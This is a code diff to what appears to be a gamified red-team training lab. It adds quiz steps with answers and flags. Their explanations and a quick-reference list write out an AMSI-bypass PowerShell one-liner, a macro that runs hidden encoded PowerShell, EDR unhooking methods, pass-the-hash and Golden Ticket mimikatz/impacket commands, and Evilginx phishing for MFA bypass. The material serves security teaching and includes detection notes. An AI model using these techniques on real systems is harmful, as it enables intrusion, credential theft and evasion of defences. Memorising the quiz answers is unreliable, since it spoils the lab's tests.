@@ -8,7 +8,7 @@ const accent = '#ff3333'
 const moduleId = 'red-team'
 const moduleName = 'Red Team Operations'
 const moduleNum = '11'
-const xpTotal = 280
+const xpTotal = 485
 
 const steps: LabStep[] = [
   {
@@ -24,16 +24,16 @@ const steps: LabStep[] = [
     id: 'redteam-02',
     title: 'Living off the Land',
     objective: 'Living-off-the-Land (LotL) attacks use built-in OS tools to avoid detection. What Windows built-in tool can download files and execute code, commonly abused by attackers?',
-    hint: 'A Windows scripting host — either powershell, wscript, or mshta are all valid.',
+    hint: 'A Windows scripting host - either powershell, wscript, or mshta are all valid.',
     answers: ['powershell', 'mshta', 'wscript', 'certutil', 'rundll32', 'regsvr32', 'bitsadmin'],
     xp: 25,
-    explanation: 'LotL techniques use legitimate binaries (LOLBins): PowerShell, certutil, mshta, regsvr32, wscript. They bypass application whitelisting since these are trusted OS components. Detection relies on behavioral analytics — a certutil.exe downloading an EXE is suspicious regardless of the tool being legitimate.'
+    explanation: 'LotL techniques use legitimate binaries (LOLBins): PowerShell, certutil, mshta, regsvr32, wscript. They bypass application whitelisting since these are trusted OS components. Detection relies on behavioral analytics - a certutil.exe downloading an EXE is suspicious regardless of the tool being legitimate.'
   },
   {
     id: 'redteam-03',
     title: 'OPSEC: Traffic Blending',
     objective: 'Red team OPSEC requires C2 traffic to look like legitimate traffic. What Cobalt Strike feature makes beacon traffic mimic real applications?',
-    hint: 'The feature is called "Malleable C2 Profiles" — it shapes the traffic to look like specific apps.',
+    hint: 'The feature is called "Malleable C2 Profiles" - it shapes the traffic to look like specific apps.',
     answers: ['malleable c2', 'malleable c2 profiles', 'c2 profiles', 'malleable profiles'],
     flag: 'FLAG{c2_opsec_mastered}',
     xp: 30,
@@ -46,7 +46,7 @@ const steps: LabStep[] = [
     hint: 'The tool is built into Windows: wmic or impacket-wmiexec from Linux.',
     answers: ['wmic', 'wmiexec', 'impacket-wmiexec', 'wmi', 'wmiexec.py'],
     xp: 25,
-    explanation: 'wmic /node:target_ip process call create "cmd.exe /c command" executes commands via WMI — no service installation required, less noisy than psexec. From Linux: impacket-wmiexec domain/user:password@target. WMI activity is logged in the Microsoft-Windows-WMI-Activity event log.'
+    explanation: 'wmic /node:target_ip process call create "cmd.exe /c command" executes commands via WMI - no service installation required, less noisy than psexec. From Linux: impacket-wmiexec domain/user:password@target. WMI activity is logged in the Microsoft-Windows-WMI-Activity event log.'
   },
   {
     id: 'redteam-05',
@@ -108,6 +108,81 @@ const steps: LabStep[] = [
     flag: 'FLAG{opsec_advanced}',
     xp: 30,
     explanation: 'Domain fronting: TLS SNI = allowed-cdn.cloudfront.net (bypasses firewall inspection), HTTP Host header = attacker.cloudfront.net (CDN routes internally to attacker server). Most CDNs have blocked this technique. Alternative - Domain borrowing uses legitimate subdomains of trusted services. Redirectors: a VPS running socat or nginx proxies traffic to the backend C2, keeping the real C2 IP hidden. Traffic shaping with jitter, sleep intervals, and business-hours-only callbacks significantly reduces automated detection.'
+  },
+  {
+    id: 'redteam-11',
+    title: 'AMSI Bypass - Defeating PowerShell Defences',
+    objective: 'AMSI (Antimalware Scan Interface) scans PowerShell scripts before execution. A common bypass patches amsi.dll in memory to always return AMSI_RESULT_CLEAN. What PowerShell technique writes a null byte to the AmsiScanBuffer function to disable scanning?',
+    hint: 'The technique involves using .NET reflection to access amsiInitFailed or patching AmsiScanBuffer bytes directly.',
+    answers: ['amsi bypass', 'patch amsi', 'amsi patch', 'reflection amsi', 'amsi.dll patch'],
+    xp: 30,
+    explanation: 'AMSI intercepts all script content before execution and sends it to registered AV products. Classic bypass (patched by most AVs): [Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiInitFailed","NonPublic,Static").SetValue($null,$true). Memory patch approach: use P/Invoke to get AmsiScanBuffer address and overwrite first bytes with 0xB8,0x57,0x00,0x07,0x80,0xC3 (mov eax,0x80070057; ret - returns error). Obfuscation layers to evade AMSI signature: string concatenation, character arrays, Base64 encoding, variable substitution, insertion in strings, escape sequences. Downgrade attack: powershell -version 2 (no AMSI in v2 - requires .NET 2.0). CLM bypass: Constrained Language Mode enforcement - use runspaces or COM objects. Modern evasion: encrypt payload, decrypt in memory using XOR/AES, only amsi-visible as gibberish. Detection: ETW (Event Tracing for Windows) logs AMSI evasion attempts in modern environments.'
+  },
+  {
+    id: 'redteam-12',
+    title: 'Phishing Infrastructure and Initial Access',
+    objective: 'Professional red teams use GoPhish to manage phishing campaigns. What does GoPhish provide for tracking when a target opens a phishing email?',
+    hint: 'A tiny invisible image embedded in the email body that loads from the GoPhish server.',
+    answers: ['tracking pixel', 'open tracking', 'email tracking', 'pixel tracker', '1x1 pixel'],
+    xp: 25,
+    explanation: 'GoPhish components: Sending Profiles (SMTP config), Landing Pages (credential harvest or payload delivery), Email Templates (with tracking pixel), Campaigns (links all components). Tracking pixel: 1x1 transparent GIF served from GoPhish server - loading it records IP, user-agent, timestamp. Click tracking: links redirect through GoPhish (TARGET_URL?rid=CAMPAIGN_ID) before sending to landing page. Infrastructure setup: domain with aged registration (30+ days), lookalike domain (company-helpdesk.com vs companyhelpdesk.com), MX record pointing to mail server, SPF/DKIM/DMARC configured to pass spam filters. Evilginx2: transparent reverse proxy that sits between target and real login page - captures credentials AND session cookies (bypasses MFA). Modlishka: alternative to Evilginx. Email payload delivery: macro-enabled documents (.docm), ISO files containing LNK, HTML smuggling (payload assembled in browser from Base64 chunks via JS). Payload considerations: staged (small dropper downloads main payload) vs stageless (full payload in document). Detection bypass: test against Defender sandbox before delivery.'
+  },
+  {
+    id: 'redteam-13',
+    title: 'Macro-Based Initial Access',
+    objective: 'A malicious Office macro downloads and executes a payload when a document is opened. What VBA function executes an external command or binary from within a macro?',
+    hint: 'A two-letter VBA built-in, or the WScript.Shell COM object method are both valid answers.',
+    answers: ['shell', 'shell()', 'wscript.shell', 'createobject wscript', 'createobject("wscript.shell")'],
+    flag: 'FLAG{initial_access}',
+    xp: 25,
+    explanation: 'Classic VBA macro: Sub AutoOpen() or Sub Document_Open() triggers on open. Shell "cmd /c powershell -nop -w hidden -enc BASE64PAYLOAD" executes command. Modern evasion: CreateObject("WScript.Shell").Run "...", 0, False (hidden window). DCOM object: GetObject("winmgmts:Win32_Process").Create "payload.exe". Sandbox evasion in macros: check username (not "SANDBOX", "MALWARE"), check computer name, check domain membership, sleep 5 minutes before running (sandbox timeout), check screen resolution (800x600 = sandbox), check running processes for analysis tools (wireshark.exe, procmon.exe). HTML smuggling (no macros needed): JS in HTML file assembles payload bytes and triggers download - bypasses email attachment scanning. Alternatives to macros: XLL add-ins (Excel), XLSB binary format, DDE (Dynamic Data Exchange - older technique), MSIX packages, ISO/VHD container (no Mark of the Web). Mark of the Web (MOTW): files downloaded from internet get Zone.Identifier ADS - Office blocks macros for MOTW files. Container files (ISO, VHD) do NOT propagate MOTW to contents - why attackers use them.'
+  },
+  {
+    id: 'redteam-14',
+    title: 'EDR Evasion - Defeating Endpoint Detection',
+    objective: 'Modern EDRs hook Windows API calls by patching ntdll.dll in user-space. A technique to bypass these hooks involves loading a fresh copy of ntdll directly from disk. What is this technique called?',
+    hint: 'The technique restores the original API stubs - it is called unhooking or direct syscalls.',
+    answers: ['unhooking', 'ntdll unhooking', 'direct syscalls', 'syscall', 'manual syscall'],
+    xp: 30,
+    explanation: 'EDR hooking: EDR injects DLL into every process, patches first bytes of sensitive APIs (NtAllocateVirtualMemory, NtWriteVirtualMemory, NtCreateThreadEx) with JMP to EDR analysis code. Bypass via unhooking: open ntdll.dll from disk (C:\\Windows\\System32\\ntdll.dll), copy .text section over the in-memory hooked copy - restoring clean syscall stubs. Direct syscalls (SysWhispers2/SysWhispers3): enumerate SSNs (System Service Numbers) at runtime, build syscall stubs that go directly to kernel without touching hooked ntdll. Hell\'s Gate: dynamically resolves SSNs from memory. Halo\'s Gate: handles hooked syscall stubs by looking at neighboring functions. Hardware breakpoints: use VEH (Vectored Exception Handler) to intercept execution at EDR hook points. Process hollowing: spawn suspended legitimate process, replace memory with malicious PE - hooks in hollowed process do not fire (process created fresh). Sleep obfuscation: encrypt beacon in memory during sleep, decrypt when active - evades memory scanner. ETW patching: patch EtwEventWrite to prevent EDR telemetry. PPID spoofing: create process with spoofed parent PID to break detection logic. Phantom DLL hollowing, module stomping: additional memory evasion. Tools: SharpBlock (ETW/AMSI), TartarusGate (syscalls), RecycledGate.'
+  },
+  {
+    id: 'redteam-15',
+    title: 'Pass-the-Hash and Pass-the-Ticket',
+    objective: 'You have an NTLM hash but not the plaintext password. What Impacket tool authenticates to remote Windows systems using only the NTLM hash?',
+    hint: 'The Impacket suite has several tools for this - psexec.py, wmiexec.py, and smbexec.py all work.',
+    answers: ['psexec.py', 'impacket-psexec', 'wmiexec.py', 'smbexec.py', 'impacket psexec', 'pth-winexe'],
+    xp: 25,
+    explanation: 'Pass-the-Hash: NTLM authentication protocol sends NT hash directly - no need to crack it. impacket-psexec DOMAIN/user@target -hashes :NTLM_HASH. wmiexec.py -hashes :HASH DOMAIN/user@target (stealthier - no service creation). CrackMapExec: cme smb SUBNET -u admin -H HASH --local-auth. PtH blocked by: LocalAccountTokenFilterPolicy=0 required for remote admin, Protected Users group (Kerberos-only), Credential Guard. Pass-the-Ticket (PtT): steal Kerberos TGT or service ticket from memory. mimikatz sekurlsa::tickets /export dumps .kirbi files. mimikatz kerberos::ptt ticket.kirbi injects ticket into current session. Rubeus.exe ptt /ticket:BASE64 injects ticket. Overpass-the-Hash: convert NT hash to Kerberos TGT - mimikatz sekurlsa::pth /user:admin /domain:domain /ntlm:HASH /run:cmd.exe. This gives full Kerberos ticket vs NTLM-only. Detection: 4624 logon events with unusual workstation, RC4 tickets (should be AES), same TGT used from multiple IPs simultaneously.'
+  },
+  {
+    id: 'redteam-16',
+    title: 'Active Directory Persistence Techniques',
+    objective: 'An attacker compromises the domain. To maintain long-term persistence they create a Golden Ticket. What account NTLM hash is required to forge a Golden Ticket?',
+    hint: 'It is the hash of a special built-in Kerberos account in every AD domain.',
+    answers: ['krbtgt', 'krbtgt hash', 'krbtgt ntlm', 'krbtgt account'],
+    flag: 'FLAG{domain_persistence}',
+    xp: 30,
+    explanation: 'Golden Ticket = forged TGT signed with krbtgt hash. Valid for 10 years by default, works even after user account deleted, survives password changes (until krbtgt rotated twice). mimikatz: kerberos::golden /user:Administrator /domain:domain.local /sid:DOMAIN_SID /krbtgt:HASH /ptt. Detection: TGT lifetime > 10 hours, missing fields, RC4 encryption when AES expected, anomalous account access. Silver Ticket: forged service ticket (TGS) signed with service account hash - no DC contact required (stealthier). Target specific services: CIFS (file shares), HOST (task scheduler), HTTP (WinRM), LDAP (AD queries). Diamond Ticket: modify legitimate TGT rather than forge - harder to detect (has legitimate PAC signature). Sapphire Ticket: copy PAC from real TGT into forged one. SID History injection: add Enterprise Admins SID to regular user\'s SID History - granted EA privileges in other domains. AdminSDHolder abuse: modify AdminSDHolder template - propagates to all protected admin accounts every 60 minutes. DSRM account: Directory Services Restore Mode local admin - reactivate for persistent local DA equivalent. Skeleton Key: mimikatz misc::skeleton patches LSASS to accept a master password "mimikatz" for ALL domain accounts (not persistent across reboot).'
+  },
+  {
+    id: 'redteam-17',
+    title: 'Red Team Reporting and Debrief',
+    objective: 'A red team engagement report includes an executive summary and technical findings. What metric measures the total time from initial breach to achieving the engagement objective?',
+    hint: 'It describes how long the attacker was inside before reaching their goal - also called breakout time.',
+    answers: ['time to objective', 'ttp dwell time', 'dwell time', 'time to compromise', 'breakout time'],
+    xp: 20,
+    explanation: 'Red team report structure: 1) Executive Summary (1-2 pages - business risk, key findings, strategic recommendations, non-technical language). 2) Engagement Scope (targets, rules of engagement, out-of-scope items, timeline). 3) Attack Narrative (chronological story of the engagement - initial access to objectives). 4) Technical Findings (per-vulnerability: severity, CVSS, description, evidence, remediation). 5) Appendices (tool output, IOCs, detection recommendations). Key metrics: Time to Initial Access (how long from start to first foothold), Time to Domain Admin (escalation speed), Dwell Time (how long undetected), Number of Alerts Generated (blue team detection rate), Objectives Achieved (percentage of defined goals). MITRE ATT&CK mapping: map each technique used to ATT&CK TTP IDs - gives defenders actionable detection logic. Severity ratings: Critical (direct path to domain/cloud admin), High (significant access or data exposure), Medium (internal access or sensitive data), Low (information disclosure, hardening opportunities). Remediation prioritisation: quick wins vs strategic improvements. Retest: always offer retest after remediation to verify fixes. Debrief: technical debrief for security team (share TTPs and detections missed), executive debrief (business risk and investment recommendations).'
+  },
+  {
+    id: 'redteam-18',
+    title: 'Full Red Team Operation - TIBER-EU Methodology',
+    objective: 'The TIBER-EU framework is used for threat intelligence-based red team testing of financial institutions. What phase comes between Preparation and Red Team Testing in the TIBER-EU framework?',
+    hint: 'It involves profiling real threat actors targeting the sector and building realistic attack scenarios.',
+    answers: ['threat intelligence', 'ti phase', 'threat intelligence phase', 'targeted threat intelligence'],
+    flag: 'FLAG{red_team_complete}',
+    xp: 35,
+    explanation: 'TIBER-EU phases: 1) Preparation (scope, procurement, legal). 2) Threat Intelligence (threat actor profiling, attack scenarios based on real adversaries targeting the sector). 3) Red Team Test (execute scenarios from TI phase). 4) Closure (reporting, remediation tracking, attestation). Other frameworks: PTES (Penetration Testing Execution Standard) - 7 phases. OSSTMM (Open Source Security Testing Methodology Manual) - very rigorous, metric-based. CBEST (UK equivalent of TIBER-EU). Full operation phases in practice: PRE-ENGAGEMENT: scoping, NDA, rules of engagement, emergency contacts (get-out-of-jail-free letter). RECONNAISSANCE: passive (Maltego, Shodan, LinkedIn, domain intel) and active (port scanning, web crawling - must be in scope). WEAPONISATION: payload development, infrastructure setup (C2, phishing, redirect servers). DELIVERY: spearphishing, watering hole, physical (USB drop, tailgating). EXPLOITATION: CVE exploitation, credential abuse, social engineering. POST-EXPLOITATION: C2 establishment, privilege escalation, persistence. LATERAL MOVEMENT: network pivoting, credential reuse. OBJECTIVE COMPLETION: data exfil, AD compromise, physical access simulation. REPORTING: findings documentation, MITRE ATT&CK mapping. Blue team integration: purple team exercises where red and blue work together reviewing detections in real-time.'
   }
 ]
 
@@ -147,7 +222,7 @@ export default function RedTeamLab() {
             <div key={i} style={{ display: 'flex', alignItems: 'center', gap: '5px' }}>
               <div style={{ width: '8px', height: '8px', borderRadius: '50%', background: p.done ? accent : '#3a0505', border: p.active ? '2px solid ' + accent : '1px solid #3a0505', boxShadow: p.active ? '0 0 6px ' + accent : 'none' }} />
               <span style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '7px', color: p.done ? accent : '#5a1515', letterSpacing: '0.1em' }}>{p.label}</span>
-              {i === 0 && <span style={{ fontSize: '7px', color: '#3a0505', margin: '0 2px' }}>—</span>}
+              {i === 0 && <span style={{ fontSize: '7px', color: '#3a0505', margin: '0 2px' }}>-</span>}
             </div>
           ))}
         </div>
@@ -156,7 +231,7 @@ export default function RedTeamLab() {
         </div>
         {guidedDone && (
           <div style={{ marginLeft: 'auto', fontFamily: 'JetBrains Mono, monospace', fontSize: '7.5px', color: accent, fontWeight: 700 }}>
-            &#10003; GUIDED PHASE COMPLETE — LAUNCH FREE LAB BELOW
+            &#10003; GUIDED PHASE COMPLETE - LAUNCH FREE LAB BELOW
           </div>
         )}
       </div>
@@ -168,20 +243,20 @@ export default function RedTeamLab() {
             <span style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '10px', color: accent, fontWeight: 700 }}>1</span>
           </div>
           <div>
-            <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.65rem', color: '#5a1515', letterSpacing: '0.2em', marginBottom: '2px' }}>PHASE 1 — GUIDED LEARNING</div>
+            <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.65rem', color: '#5a1515', letterSpacing: '0.2em', marginBottom: '2px' }}>PHASE 1 - GUIDED LEARNING</div>
             <h1 style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '1.4rem', fontWeight: 700, color: accent, margin: 0 }}>Red Team Operations Lab</h1>
           </div>
         </div>
 
         <p style={{ color: '#8a6a6a', fontSize: '0.85rem', marginBottom: '1rem', lineHeight: 1.7, fontFamily: 'JetBrains Mono, monospace' }}>
-          C2 frameworks, living-off-the-land techniques, OPSEC, lateral movement, and persistence.
-          Type real commands, earn XP, and capture flags. Complete all 10 steps to unlock Phase 2.
+          C2 frameworks, living-off-the-land techniques, OPSEC, lateral movement, persistence, EDR evasion, and full operation lifecycle.
+          Type real commands, earn XP, and capture flags. Complete all 18 steps to unlock Phase 2.
         </p>
 
         <div style={{ background: 'rgba(255,51,51,0.03)', border: '1px solid rgba(255,51,51,0.12)', borderRadius: '6px', padding: '1rem 1.25rem', marginBottom: '1.25rem', fontFamily: 'JetBrains Mono, monospace' }}>
           <div style={{ fontSize: '7px', color: '#3a0505', letterSpacing: '0.25em', marginBottom: '8px' }}>KEY CONCEPTS COVERED IN THIS LAB</div>
           <div style={{ display: 'flex', flexWrap: 'wrap', gap: '6px' }}>
-            {['C2 frameworks', 'Malleable C2 profiles', 'LOLBins / LotL', 'OPSEC tradecraft', 'WMI lateral movement', 'Registry persistence', 'EDR evasion', 'Red team reporting'].map(c => (
+            {['C2 frameworks', 'Malleable C2 profiles', 'LOLBins / LotL', 'OPSEC tradecraft', 'WMI lateral movement', 'Registry persistence', 'EDR evasion', 'AMSI bypass', 'Phishing infra', 'Macro initial access', 'Pass-the-Hash', 'AD persistence', 'Red team reporting', 'TIBER-EU methodology'].map(c => (
               <span key={c} style={{ fontSize: '7.5px', color: '#8a4a4a', background: 'rgba(255,51,51,0.06)', border: '1px solid rgba(255,51,51,0.12)', padding: '2px 8px', borderRadius: '3px' }}>{c}</span>
             ))}
           </div>
@@ -204,7 +279,7 @@ export default function RedTeamLab() {
             <span style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '10px', color: guidedDone ? accent : '#5a1515', fontWeight: 700 }}>2</span>
           </div>
           <div>
-            <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.65rem', color: guidedDone ? '#8a4a4a' : '#5a1515', letterSpacing: '0.2em', marginBottom: '2px' }}>PHASE 2 — FREE LAB ENVIRONMENT</div>
+            <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.65rem', color: guidedDone ? '#8a4a4a' : '#5a1515', letterSpacing: '0.2em', marginBottom: '2px' }}>PHASE 2 - FREE LAB ENVIRONMENT</div>
             <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '1.1rem', fontWeight: 700, color: guidedDone ? accent : '#5a1515' }}>Full Red Team Practice Sandbox</div>
           </div>
           {guidedDone && !freeLaunched && (
@@ -230,7 +305,7 @@ export default function RedTeamLab() {
               Command history &nbsp;·&nbsp; Tab autocomplete &nbsp;·&nbsp; Real command simulation &nbsp;·&nbsp; No restrictions
             </div>
             <div style={{ display: 'flex', gap: '12px', justifyContent: 'center', flexWrap: 'wrap', marginBottom: '2rem' }}>
-              {['Sliver C2 framework', 'LOLBin techniques', 'WMI lateral movement', 'Registry persistence', 'EDR evasion', 'OPSEC tradecraft'].map(feat => (
+              {['Sliver C2 framework', 'LOLBin techniques', 'WMI lateral movement', 'Registry persistence', 'EDR evasion', 'AMSI bypass', 'Phishing infrastructure', 'AD persistence'].map(feat => (
                 <div key={feat} style={{ display: 'flex', alignItems: 'center', gap: '5px' }}>
                   <div style={{ width: '4px', height: '4px', borderRadius: '50%', background: guidedDone ? accent : '#3a0505' }} />
                   <span style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '7.5px', color: guidedDone ? '#8a4a4a' : '#3a0505' }}>{feat}</span>
@@ -244,7 +319,7 @@ export default function RedTeamLab() {
             >
               {guidedDone ? '&#9658; LAUNCH FREE LAB ENVIRONMENT' : '&#128274; COMPLETE GUIDED PHASE FIRST'}
             </button>
-            {!guidedDone && <div style={{ marginTop: '1rem', fontFamily: 'JetBrains Mono, monospace', fontSize: '7px', color: '#3a0505' }}>Complete all 10 guided steps above to unlock the free lab environment</div>}
+            {!guidedDone && <div style={{ marginTop: '1rem', fontFamily: 'JetBrains Mono, monospace', fontSize: '7px', color: '#3a0505' }}>Complete all 18 guided steps above to unlock the free lab environment</div>}
           </div>
         ) : (
           <div style={{ border: '1px solid ' + accent + '30', borderRadius: '10px', overflow: 'hidden', background: '#080202' }}>
@@ -262,7 +337,7 @@ export default function RedTeamLab() {
       {/* Quick reference */}
       <div style={{ marginBottom: '2rem' }}>
         <button onClick={() => setShowKeywords(!showKeywords)} style={{ background: 'transparent', border: '1px solid #3a0505', borderRadius: '5px', padding: '8px 16px', cursor: 'pointer', fontFamily: 'JetBrains Mono, monospace', fontSize: '7.5px', color: '#5a1515', letterSpacing: '0.1em', marginBottom: showKeywords ? '12px' : 0 }}>
-          {showKeywords ? '▼' : '▶'} QUICK REFERENCE — RED TEAM COMMANDS
+          {showKeywords ? '▼' : '▶'} QUICK REFERENCE - RED TEAM COMMANDS
         </button>
         {showKeywords && (
           <div style={{ background: '#080202', border: '1px solid #1a0505', borderRadius: '6px', padding: '1.25rem', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.75rem' }}>
@@ -280,6 +355,10 @@ export default function RedTeamLab() {
                 ['Invoke-BloodHound -CollectionMethod All', 'BloodHound PowerShell collection'],
                 ['Rubeus.exe kerberoast /outfile:hashes.txt', '.NET Kerberoasting'],
                 ['SharpHound.exe -c All --zipfilename loot.zip', 'SharpHound AD collection'],
+                ['impacket-psexec DOMAIN/user@target -hashes :NTLM_HASH', 'Pass-the-Hash via psexec'],
+                ['mimikatz kerberos::golden /user:Administrator /domain:DOMAIN /sid:SID /krbtgt:HASH /ptt', 'Forge Golden Ticket'],
+                ['Rubeus.exe ptt /ticket:BASE64TICKET', 'Inject Kerberos ticket'],
+                ['gophish', 'Start GoPhish phishing framework'],
               ].map(([cmd, desc]) => (
                 <div key={cmd} style={{ display: 'flex', gap: '10px', alignItems: 'flex-start', padding: '6px 8px', background: '#060101', borderRadius: '4px' }}>
                   <code style={{ color: accent, fontSize: '0.72rem', flexShrink: 0 }}>{cmd}</code>
